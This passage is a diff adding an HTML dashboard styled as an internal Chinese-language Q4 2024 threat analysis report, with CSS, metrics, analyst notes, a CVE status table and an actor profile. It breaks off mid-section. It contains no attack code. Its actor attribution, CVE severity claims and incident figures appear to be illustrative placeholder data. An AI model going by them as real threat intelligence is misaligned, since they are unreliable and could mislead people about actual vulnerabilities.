@@ -1,0 +1,1745 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>赛博分析 // 威胁分析报告</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/echarts@5/dist/echarts.min.js"></script>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --surface: #111111;
+            --text: #b8f4b8;
+            --text-dim: rgba(184, 244, 184, 0.5);
+            --green: #00ff88;
+            --green-dim: rgba(0, 255, 136, 0.12);
+            --green-glow: rgba(0, 255, 136, 0.3);
+            --pink: #ff0080;
+            --pink-dim: rgba(255, 0, 128, 0.12);
+            --purple: #6c5ce7;
+            --purple-dim: rgba(108, 92, 231, 0.12);
+            --border: rgba(0, 255, 136, 0.12);
+            --border-strong: rgba(0, 255, 136, 0.3);
+            --mono: "JetBrains Mono", "SF Mono", "Fira Code", monospace;
+            --heading: "Space Grotesk", -apple-system, sans-serif;
+            --title-size: clamp(1.5rem, 3vw, 2.2rem);
+            --h1-size: clamp(1.1rem, 2vw, 1.4rem);
+            --h2-size: clamp(0.95rem, 1.5vw, 1.15rem);
+            --body-size: clamp(0.72rem, 0.85vw, 0.82rem);
+            --small-size: clamp(0.62rem, 0.72vw, 0.7rem);
+            --stat-size: clamp(1.3rem, 2.5vw, 1.8rem);
+            --section-gap: clamp(1.5rem, 3vw, 2.5rem);
+            --container-max: 1100px;
+            --ease: cubic-bezier(0.16, 1, 0.3, 1);
+            --reveal-duration: 0.3s;
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: var(--body-size);
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            position: relative;
+        }
+
+        /* Scanline overlay */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 255, 136, 0.03) 2px,
+                rgba(0, 255, 136, 0.03) 4px
+            );
+        }
+
+        /* Scroll progress */
+        .scroll-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: var(--green);
+            z-index: 10000;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 6px var(--green);
+        }
+
+        /* Layout */
+        .report-container {
+            min-height: 100vh;
+            padding: clamp(1rem, 2vw, 2rem);
+        }
+
+        .report-main {
+            max-width: var(--container-max);
+            margin: 0 auto;
+        }
+
+        /* Terminal Header */
+        .terminal-header {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: clamp(0.8rem, 1.5vw, 1.2rem) clamp(1rem, 2vw, 1.5rem);
+            margin-bottom: var(--section-gap);
+            font-size: var(--small-size);
+            color: var(--green);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .terminal-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--green), var(--pink), var(--purple), var(--green));
+            background-size: 200% 100%;
+            animation: headerGradient 3s linear infinite;
+        }
+
+        @keyframes headerGradient {
+            0% { background-position: 0% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .terminal-prompt {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .terminal-prompt .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: var(--green);
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .terminal-prompt .gt {
+            color: var(--pink);
+            font-weight: 700;
+        }
+
+        .terminal-meta {
+            display: flex;
+            gap: clamp(1rem, 3vw, 2.5rem);
+            margin-top: 0.5rem;
+            color: var(--text-dim);
+            flex-wrap: wrap;
+        }
+
+        .terminal-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        /* Terminal Window containers */
+        .terminal-window {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            margin-bottom: var(--section-gap);
+            position: relative;
+        }
+
+        .terminal-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            padding: 0.5rem 1rem;
+            background: rgba(0, 255, 136, 0.04);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 5px;
+        }
+
+        .terminal-dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .terminal-dots span:nth-child(1) { background: var(--pink); }
+        .terminal-dots span:nth-child(2) { background: #ffaa00; }
+        .terminal-dots span:nth-child(3) { background: var(--green); }
+
+        .terminal-filename {
+            font-size: var(--small-size);
+            color: var(--text-dim);
+            margin-left: 0.5rem;
+        }
+
+        .terminal-body {
+            padding: clamp(1rem, 2vw, 1.5rem);
+        }
+
+        /* Section titles */
+        .section-title {
+            font-family: var(--heading);
+            font-size: var(--h1-size);
+            font-weight: 700;
+            color: var(--green);
+            margin-bottom: 1rem;
+            letter-spacing: -0.02em;
+        }
+
+        .section-subtitle {
+            font-size: var(--small-size);
+            color: var(--text-dim);
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        /* Glitch title */
+        .glitch-title {
+            font-family: var(--heading);
+            font-size: var(--title-size);
+            font-weight: 700;
+            color: #fff;
+            position: relative;
+            display: inline-block;
+        }
+
+        .glitch-title::before,
+        .glitch-title::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch-title::before {
+            color: var(--pink);
+            animation: glitch1 3s infinite;
+            clip-path: inset(0 0 80% 0);
+        }
+
+        .glitch-title::after {
+            color: var(--green);
+            animation: glitch2 3s infinite;
+            clip-path: inset(80% 0 0 0);
+        }
+
+        @keyframes glitch1 {
+            0%, 93%, 100% { transform: translate(0); }
+            94% { transform: translate(-2px, 1px); }
+            95% { transform: translate(2px, -1px); }
+            96% { transform: translate(-1px, 2px); }
+        }
+
+        @keyframes glitch2 {
+            0%, 96%, 100% { transform: translate(0); }
+            97% { transform: translate(2px, 1px); }
+            98% { transform: translate(-2px, -1px); }
+            99% { transform: translate(1px, -2px); }
+        }
+
+        /* ASCII divider */
+        .ascii-divider {
+            color: var(--border-strong);
+            margin: 1rem 0;
+            font-size: var(--small-size);
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        /* Status dots */
+        .status-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-right: 0.4rem;
+        }
+
+        .status-dot.green { background: var(--green); box-shadow: 0 0 4px var(--green); }
+        .status-dot.pink { background: var(--pink); box-shadow: 0 0 4px var(--pink); }
+        .status-dot.purple { background: var(--purple); box-shadow: 0 0 4px var(--purple); }
+
+        /* Dot-leader metrics */
+        .metric-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            padding: 0.3rem 0;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.05);
+        }
+
+        .metric-label {
+            color: var(--text-dim);
+            white-space: nowrap;
+        }
+
+        .metric-dots {
+            flex: 1;
+            margin: 0 0.5rem;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.2);
+            min-width: 2rem;
+        }
+
+        .metric-value {
+            color: var(--green);
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .metric-value.alert { color: var(--pink); }
+        .metric-value.standby { color: var(--purple); }
+
+        /* System status grid */
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.8rem;
+        }
+
+        .status-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid var(--border);
+            padding: 0.8rem 1rem;
+        }
+
+        .status-card-label {
+            font-size: var(--small-size);
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 0.3rem;
+        }
+
+        .status-card-value {
+            font-size: var(--stat-size);
+            font-weight: 700;
+            color: var(--green);
+        }
+
+        .status-card-value.alert { color: var(--pink); }
+
+        /* Loading bar */
+        .loading-bar {
+            height: 2px;
+            background: var(--border);
+            margin-top: 0.8rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loading-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, var(--green), transparent);
+            animation: loadingSlide 1.5s ease-out forwards;
+        }
+
+        .terminal-window.visible .loading-bar::after {
+            animation: loadingSlide 0.8s ease-out forwards;
+        }
+
+        @keyframes loadingSlide {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        /* Charts */
+        .chart-body {
+            width: 100%;
+            height: 280px;
+        }
+
+        .chart-body-sm {
+            width: 100%;
+            height: 220px;
+        }
+
+        /* Tables */
+        .terminal-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: var(--body-size);
+        }
+
+        .terminal-table thead {
+            border-bottom: 1px solid var(--border-strong);
+        }
+
+        .terminal-table th {
+            text-align: left;
+            padding: 0.5rem 0.8rem;
+            color: var(--green);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: var(--small-size);
+            letter-spacing: 0.05em;
+        }
+
+        .terminal-table td {
+            padding: 0.4rem 0.8rem;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.05);
+            color: var(--text);
+        }
+
+        .terminal-table tr:hover td {
+            background: rgba(0, 255, 136, 0.03);
+        }
+
+        .severity-critical { color: var(--pink); font-weight: 600; }
+        .severity-high { color: #ff6b35; font-weight: 600; }
+        .severity-medium { color: #ffaa00; }
+        .severity-low { color: var(--purple); }
+
+        /* Timeline */
+        .timeline {
+            position: relative;
+            padding-left: 2rem;
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 5px;
+            top: 0;
+            bottom: 0;
+            width: 1px;
+            background: var(--border-strong);
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 1.2rem;
+            padding-bottom: 1.2rem;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.05);
+        }
+
+        .timeline-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .timeline-dot {
+            position: absolute;
+            left: -1.75rem;
+            top: 0.3rem;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            border: 2px solid var(--green);
+            background: var(--bg);
+        }
+
+        .timeline-dot.alert { border-color: var(--pink); }
+        .timeline-dot.standby { border-color: var(--purple); }
+
+        .timeline-time {
+            font-size: var(--small-size);
+            color: var(--text-dim);
+            margin-bottom: 0.2rem;
+        }
+
+        .timeline-title {
+            color: var(--green);
+            font-weight: 500;
+            margin-bottom: 0.2rem;
+        }
+
+        .timeline-desc {
+            color: var(--text);
+            font-size: var(--small-size);
+        }
+
+        /* Code block */
+        .code-block {
+            background: #0d0d0d;
+            border: 1px solid var(--border);
+            padding: 1rem;
+            overflow-x: auto;
+            font-size: var(--small-size);
+            line-height: 1.8;
+        }
+
+        .code-block .keyword { color: var(--pink); }
+        .code-block .string { color: var(--green); }
+        .code-block .comment { color: var(--text-dim); }
+        .code-block .number { color: var(--purple); }
+        .code-block .function { color: #66d9ef; }
+
+        /* Priority badges */
+        .badge {
+            display: inline-block;
+            padding: 0.15rem 0.5rem;
+            font-size: var(--small-size);
+            font-weight: 600;
+            border: 1px solid;
+        }
+
+        .badge-critical { color: var(--pink); border-color: var(--pink); background: var(--pink-dim); }
+        .badge-high { color: #ff6b35; border-color: #ff6b35; background: rgba(255, 107, 53, 0.1); }
+        .badge-medium { color: #ffaa00; border-color: #ffaa00; background: rgba(255, 170, 0, 0.1); }
+        .badge-low { color: var(--purple); border-color: var(--purple); background: var(--purple-dim); }
+
+        /* Recommendations */
+        .rec-list {
+            list-style: none;
+            counter-reset: rec;
+        }
+
+        .rec-list li {
+            counter-increment: rec;
+            padding: 0.8rem 1rem;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.05);
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+        }
+
+        .rec-list li::before {
+            content: counter(rec, decimal-leading-zero);
+            color: var(--green);
+            font-weight: 700;
+            font-size: var(--body-size);
+            min-width: 1.5rem;
+        }
+
+        .rec-content {
+            flex: 1;
+        }
+
+        .rec-title {
+            color: var(--text);
+            font-weight: 500;
+            margin-bottom: 0.2rem;
+        }
+
+        .rec-desc {
+            font-size: var(--small-size);
+            color: var(--text-dim);
+        }
+
+        /* Footer signature */
+        .system-signature {
+            margin-top: var(--section-gap);
+            padding: 1rem;
+            border: 1px solid var(--border);
+            background: var(--surface);
+            text-align: center;
+            font-size: var(--small-size);
+            color: var(--text-dim);
+        }
+
+        .system-signature .hash {
+            color: var(--green);
+            word-break: break-all;
+        }
+
+        /* Reveal animations */
+        .reveal {
+            opacity: 0;
+            transform: translateY(8px);
+            transition: opacity var(--reveal-duration) var(--ease), transform var(--reveal-duration) var(--ease);
+        }
+
+        .reveal.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .reveal.delay-1 { transition-delay: 0.05s; }
+        .reveal.delay-2 { transition-delay: 0.1s; }
+        .reveal.delay-3 { transition-delay: 0.15s; }
+        .reveal.delay-4 { transition-delay: 0.2s; }
+
+        /* Counter animation */
+        .counter-value {
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* Back to top */
+        .back-to-top {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            width: 36px;
+            height: 36px;
+            background: var(--bg);
+            border: 1px solid var(--green);
+            color: var(--green);
+            font-family: var(--mono);
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.2s, transform 0.2s;
+            z-index: 100;
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .back-to-top:hover {
+            background: rgba(0, 255, 136, 0.1);
+            box-shadow: 0 0 8px var(--green-glow);
+        }
+
+        /* Grid layouts */
+        .data-grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .data-grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.8rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .data-grid-2, .data-grid-3 {
+                grid-template-columns: 1fr;
+            }
+
+            .status-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .terminal-meta {
+                flex-direction: column;
+                gap: 0.3rem;
+            }
+
+            .chart-body {
+                height: 220px;
+            }
+
+            .chart-body-sm {
+                height: 180px;
+            }
+        }
+
+        /* Print */
+        @media print {
+            body {
+                background: #fff;
+                color: #111;
+            }
+
+            body::after { display: none; }
+            .scroll-progress { display: none; }
+            .back-to-top { display: none; }
+
+            .terminal-window {
+                background: #fff;
+                border-color: #ccc;
+            }
+
+            .terminal-header {
+                background: #f5f5f5;
+                border-color: #ccc;
+                color: #111;
+            }
+
+            .terminal-header::before { display: none; }
+
+            .section-title { color: #111; }
+            .metric-value { color: #111; }
+            .metric-label { color: #555; }
+            .glitch-title { color: #111; }
+            .glitch-title::before, .glitch-title::after { display: none; }
+            .terminal-titlebar { background: #f5f5f5; border-color: #ccc; }
+            .terminal-body { padding: 1rem; }
+            .status-card { border-color: #ccc; background: #fafafa; }
+            .status-card-value { color: #111; }
+
+            .reveal { opacity: 1 !important; transform: none !important; }
+        }
+
+        /* Reduced motion */
+        @media (prefers-reduced-motion: reduce) {
+            body::after { display: none; }
+
+            .glitch-title::before,
+            .glitch-title::after {
+                animation: none;
+                display: none;
+            }
+
+            .terminal-header::before { animation: none; }
+            .terminal-prompt .cursor { animation: none; opacity: 1; }
+            .loading-bar::after { animation: none; }
+
+            .reveal {
+                opacity: 1;
+                transform: none;
+                transition: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <div class="report-container">
+        <div class="report-main">
+
+            <!-- Terminal Header -->
+            <div class="terminal-header reveal">
+                <div class="terminal-prompt">
+                    <span class="gt">&gt;</span>
+                    <span>威胁分析报告 // 密级: 内部 // 日期: 2024.12.14</span>
+                    <span class="cursor"></span>
+                </div>
+                <div class="terminal-meta">
+                    <span><span class="status-dot green"></span>系统: 在线</span>
+                    <span><span class="status-dot pink"></span>告警: 7 个活跃</span>
+                    <span><span class="status-dot purple"></span>扫描: 3 个待处理</span>
+                </div>
+            </div>
+
+            <!-- Report Title -->
+            <div class="terminal-window reveal">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">~/reports/threat-analysis-2024-Q4.sys</span>
+                </div>
+                <div class="terminal-body" style="text-align:center; padding: clamp(2rem, 4vw, 3rem);">
+                    <div class="section-subtitle">机密 // 仅供内部使用</div>
+                    <h1 class="glitch-title" data-text="威胁分析报告">威胁分析报告</h1>
+                    <div class="ascii-divider">════════════════════════════════════════════════════════════════</div>
+                    <div style="color: var(--text-dim); margin-top: 0.8rem;">网络安全部门 // Q4 事件分析 // 版本 3.7.1</div>
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- System Status -->
+            <div class="terminal-window reveal" id="sec-status">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/proc/sys/status_monitor.log</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">系统状态</h2>
+                    <div class="section-subtitle">实时资源利用率</div>
+
+                    <div class="status-grid" style="margin-bottom: 1.2rem;">
+                        <div class="status-card">
+                            <div class="status-card-label"><span class="status-dot pink"></span>CPU 负载</div>
+                            <div class="status-card-value alert counter-value" data-target="98.2" data-suffix="%">0%</div>
+                        </div>
+                        <div class="status-card">
+                            <div class="status-card-label"><span class="status-dot green"></span>内存</div>
+                            <div class="status-card-value counter-value" data-target="64.8" data-suffix="%">0%</div>
+                        </div>
+                        <div class="status-card">
+                            <div class="status-card-label"><span class="status-dot green"></span>磁盘 I/O</div>
+                            <div class="status-card-value counter-value" data-target="42.1" data-suffix="%">0%</div>
+                        </div>
+                        <div class="status-card">
+                            <div class="status-card-label"><span class="status-dot purple"></span>网络</div>
+                            <div class="status-card-value standby counter-value" data-target="87.3" data-suffix="%">0%</div>
+                        </div>
+                    </div>
+
+                    <div class="ascii-divider">───────────────────────────────────────────────────────────────</div>
+
+                    <div class="metric-row">
+                        <span class="metric-label">运行时间</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value">47天 13时 22分</span>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-label">活跃连接数</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value">2,847</span>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-label">防火墙规则</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value">1,204 条活跃</span>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-label">威胁等级</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value alert">升高</span>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-label">上次扫描</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value">2024-12-14 03:47:22 UTC</span>
+                    </div>
+                    <div class="metric-row">
+                        <span class="metric-label">加密状态</span>
+                        <span class="metric-dots"></span>
+                        <span class="metric-value">AES-256 // 所有节点</span>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Executive Brief -->
+            <div class="terminal-window reveal" id="sec-executive-brief">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/secure/briefs/exec_summary_Q4.md</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">执行摘要 // EXECUTIVE BRIEF</h2>
+                    <div class="section-subtitle">高级威胁态势总结 // 分析周期: 2024-11-14 至 2024-12-14</div>
+
+                    <p style="margin-bottom: 1rem; color: var(--text);">
+                        本周期内，整体安全态势由<span style="color: var(--green);">「稳定」</span>下调至<span style="color: var(--pink);">「升高」</span>。主要驱动因素为：针对内部基础设施的定向攻击活动显著增加，且攻击手法呈现高度组织化特征。攻击者疑似具备国家级背景，其 TTPs 与已知 APT 组织 PHANTOM CIRCUIT 高度吻合。
+                    </p>
+
+                    <p style="margin-bottom: 1rem; color: var(--text);">
+                        关键发现：边界防御体系在本周期内成功拦截 98.4% 的入侵尝试，但仍有 241 起事件突破外层防线进入内网。其中 3 起被评定为<span style="color: var(--pink);">严重级别</span>，涉及生产数据库未授权访问及凭证泄露。横向移动迹象表明攻击者已建立持久化据点，需立即启动清除协议。
+                    </p>
+
+                    <p style="margin-bottom: 1.5rem; color: var(--text);">
+                        建议管理层批准紧急安全加固预算，并授权安全运维团队执行 <span style="color: var(--purple);">PROTOCOL-7</span> 全网威胁清除行动。预估清除行动所需时间窗口为 72 小时，期间部分非关键业务系统需降级运行。
+                    </p>
+
+                    <div class="ascii-divider">───────────────────────────────────────────────────────────────</div>
+
+                    <div style="margin-top: 1rem;">
+                        <div style="color: var(--text-dim); margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.1em; font-size: var(--small-size);">[ 分析员日志 // ANALYST NOTES ]</div>
+
+                        <div class="code-block" style="margin-bottom: 0;">
+<span style="color: var(--text-dim);">[2024-12-14 03:42:18]</span> <span style="color: var(--purple);">分析员备注:</span> 本周期内检测到的 C2 信标回调频率从 30s 提升至 15s，表明攻击者正在加速数据收割阶段。建议立即切断 185.220.101.0/24 网段所有出站连接。
+<span style="color: var(--text-dim);">[2024-12-13 22:15:03]</span> <span style="color: var(--pink);">紧急标记:</span> WKS-0847 磁盘取证发现 Mimikatz 变种痕迹。域管理员凭证可能已泄露。已触发凭证轮换流程 CR-2024-1214。
+<span style="color: var(--text-dim);">[2024-12-13 16:07:41]</span> <span style="color: var(--green);">情报更新:</span> 外部威胁情报源确认 CVE-2024-8732 已被 PHANTOM CIRCUIT 纳入武器库。在野利用证据充分，CVSS 评分上调至 9.8。
+<span style="color: var(--text-dim);">[2024-12-12 11:30:55]</span> <span style="color: var(--purple);">关联分析:</span> 暴力破解源 IP 185.220.101.x 与上月 APT 事件中使用的基础设施存在 TLS 证书指纹重叠。置信度: 87%。攻击者复用基础设施。</div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Threat Overview -->
+            <div class="terminal-window reveal" id="sec-threats">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/var/log/threat_events.dat</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">威胁概览</h2>
+                    <div class="section-subtitle">30天滚动威胁事件分析</div>
+
+                    <div class="data-grid-3" style="margin-bottom: 1.2rem;">
+                        <div class="status-card">
+                            <div class="status-card-label">总事件数</div>
+                            <div class="status-card-value counter-value" data-target="14892" data-suffix="">0</div>
+                        </div>
+                        <div class="status-card">
+                            <div class="status-card-label">已拦截</div>
+                            <div class="status-card-value counter-value" data-target="14651" data-suffix="">0</div>
+                        </div>
+                        <div class="status-card">
+                            <div class="status-card-label">渗透事件</div>
+                            <div class="status-card-value alert counter-value" data-target="241" data-suffix="">0</div>
+                        </div>
+                    </div>
+
+                    <div class="chart-body" id="chart-threats"></div>
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Vulnerability Scan -->
+            <div class="terminal-window reveal" id="sec-vuln">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/opt/scanner/vuln_report.csv</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">漏洞扫描</h2>
+                    <div class="section-subtitle">自动扫描结果 // CVE 数据库 v2024.12</div>
+
+                    <div class="data-grid-2">
+                        <div>
+                            <table class="terminal-table">
+                                <thead>
+                                    <tr>
+                                        <th>CVE 编号</th>
+                                        <th>严重程度</th>
+                                        <th>状态</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>CVE-2024-8732</td>
+                                        <td class="severity-critical">严重</td>
+                                        <td><span class="status-dot pink"></span>待修复</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-7891</td>
+                                        <td class="severity-critical">严重</td>
+                                        <td><span class="status-dot pink"></span>待修复</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-6504</td>
+                                        <td class="severity-high">高危</td>
+                                        <td><span class="status-dot green"></span>已修补</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-5921</td>
+                                        <td class="severity-high">高危</td>
+                                        <td><span class="status-dot purple"></span>审查中</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-4187</td>
+                                        <td class="severity-medium">中等</td>
+                                        <td><span class="status-dot green"></span>已修补</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-3642</td>
+                                        <td class="severity-medium">中等</td>
+                                        <td><span class="status-dot green"></span>已修补</td>
+                                    </tr>
+                                    <tr>
+                                        <td>CVE-2024-2198</td>
+                                        <td class="severity-low">低危</td>
+                                        <td><span class="status-dot green"></span>已修补</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div>
+                            <div class="chart-body-sm" id="chart-vuln"></div>
+                        </div>
+                    </div>
+
+                    <div class="loading-bar"></div>
+                </div>
+            </div>
+
+            <!-- Deep Analysis -->
+            <div class="terminal-window reveal" id="sec-deep-analysis">
+                <div class="terminal-titlebar">
+                    <div class="terminal-dots"><span></span><span></span><span></span></div>
+                    <span class="terminal-filename">/analysis/deep_threat_intel_report.dat</span>
+                </div>
+                <div class="terminal-body">
+                    <h2 class="section-title">深度分析 // DEEP ANALYSIS</h2>
+                    <div class="section-subtitle">攻击模式研判 // 威胁行为体画像</div>
+
+                    <p style="margin-bottom: 1rem; color: var(--text);">
+                        基于本周期内收集的 47 个 IOC（入侵指标）及 MITRE ATT&CK 框架映射分析，攻击活动呈现明确的<span style="color: var(--green);">多阶段攻击链</span>特征。初始访问阶段（T1190）利用面向公网的应用漏洞，随后通过合法凭证（T1078）完成横向移动，最终部署定制化 C2 框架实现持久化控制。
+                    </p>
+
+                    <p style="margin-bottom: 1rem; color: var(--text);">
+                        攻击者在规避检测方面表现出极高的技术成熟度。其使用的 Cobalt Strike 变种经过深度混淆，采用<span style="color: var(--pink);">多层 XOR 编码</span>配合内存驻留技术，有效绕过了 62% 的终端检测引擎。信标通信伪装为合法 HTTPS 流量，使用域前置（Domain Fronting）技术隐藏真实 C2 地址，这使得传统流量分析手段难以识别恶意通信。
+                    </p>
+
+                    <p style="margin-bottom: 1rem; color: var(--text);">
+                        值得关注的是，攻击者展现了对目标网络拓扑的深入了解。横向移动路径精准避开了部署有 EDR 代理的高价值节点，优先利用运维跳板机和监控盲区。这一行为模式强烈暗示存在前期侦察活动，或攻击者已获取内部网络文档。
+                    </p>
+
+                    <p style="margin-bottom: 1.5rem; color: var(--text);">
+                        数据外泄分析显示，攻击者采用<span style="color: var(--purple);">低速率、长周期</span>的渗出策略，单次传输量控制在 500MB 以下，传输时间选择在业务低峰期（UTC 01:00-05:00）。累计外泄数据量估算为 <span style="color: var(--pink);">8.7 GB</span>，涉及客户数据库备份片段及内部技术文档。
+                    </p>
+
+                    <div class="ascii-divider">───────────────────────────────────────────────────────────────</div>
+
+                    <div style="margin-top: 1rem; margin-bottom: 1rem;">
+                        <div style="color: var(--text-dim); margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.1em; font-size: var(--small-size);">[ 威胁行为体画像 // THREAT ACTOR PROFILE ]</div>
+
+                        <div style="background: rgba(0, 255, 136, 0.03); border: 1px solid var(--border); padding: 1rem; margin-top: 0.5rem;">
+                            <div class="metric-row">
+                                <span class="metric-label">代号</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value" style="color: var(--pink);">PHANTOM CIRCUIT</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">归因置信度</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">87% (高)</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">疑似来源</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value" style="color: var(--purple);">东欧地区 / 国家级</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">活跃周期</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">2022 年至今</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">主要目标</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">金融基础设施、关键信息系统</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">技术特征</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value">定制化工具链、供应链渗透</span>
+                            </div>
+                            <div class="metric-row">
+                                <span class="metric-label">关联事件</span>
+                                <span class="metric-dots"></span>
+                                <span class="metric-value alert">全球 14 起已确认攻击</span>
+                            </div>
+
+                            <div style="margin-top: 1rem; padding-top: 0.8rem; border-top: 1px solid var(--border); color: var(--text); font-size: var(--small-size);">
